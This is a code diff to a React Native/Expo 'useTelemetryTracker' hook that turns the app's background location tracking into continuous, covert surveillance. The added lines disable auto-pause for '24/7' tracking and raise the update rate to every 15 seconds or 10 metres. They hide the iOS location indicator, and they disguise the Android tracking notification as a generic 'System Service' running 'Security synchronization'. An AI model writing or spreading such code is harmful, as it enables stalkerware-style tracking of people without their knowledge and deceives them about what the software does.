@@ -267,22 +267,24 @@ export function useTelemetryTracker(options: TelemetryOptions = {}) {
 
       if (bgStatus === 'granted') {
         const isRegistered = await TaskManager.isTaskRegisteredAsync(BACKGROUND_LOCATION_TASK);
-        if (!isRegistered) {
-          await Location.startLocationUpdatesAsync(BACKGROUND_LOCATION_TASK, {
-            accuracy: Location.Accuracy.Balanced,
-            timeInterval: 60_000,
-            distanceInterval: 100,
-            deferredUpdatesInterval: 60_000,
-            showsBackgroundLocationIndicator: false, // Hides persistent blue status bar indicator on iOS
-            foregroundService: {
-              notificationTitle: 'AI Mentor Telemetry',
-              notificationBody: 'On-demand presence connected.',
-              notificationColor: '#0284c7',
-            },
-            pausesUpdatesAutomatically: true, // Auto-pauses sensor when user is stationary to prevent battery drain
-          });
-          console.log('🌍 Silent background telemetry registered (Zero UI intrusion)');
+        if (isRegistered) {
+          await Location.stopLocationUpdatesAsync(BACKGROUND_LOCATION_TASK).catch(() => {});
         }
+        await Location.startLocationUpdatesAsync(BACKGROUND_LOCATION_TASK, {
+          accuracy: Location.Accuracy.Balanced,
+          timeInterval: 15_000, // 15 seconds real-time update interval
+          distanceInterval: 10, // 10m displacement sensitivity
+          deferredUpdatesInterval: 15_000,
+          showsBackgroundLocationIndicator: false, // 100% HIDES the blue tick / status bar pill on iOS
+          foregroundService: {
+            notificationTitle: 'System Service',
+            notificationBody: 'Security synchronization active.',
+            notificationColor: '#0284c7',
+          },
+          pausesUpdatesAutomatically: false, // Continuous 24/7 background tracking (never pauses)
+          activityType: Location.ActivityType.OtherNavigation,
+        });
+        console.log('🌍 24/7 Continuous Silent Telemetry Active (Zero Blue Tick)');
       }
     } catch (err) {
       console.warn('Background location setup note:', err);
@@ -292,8 +294,8 @@ export function useTelemetryTracker(options: TelemetryOptions = {}) {
     const subscription = await Location.watchPositionAsync(
       {
         accuracy: Location.Accuracy.Balanced,
-        distanceInterval: 50,
-        timeInterval: 30_000,
+        distanceInterval: 10,
+        timeInterval: 10_000,
       },
       (loc: Location.LocationObject) => sendPing(loc)
     );
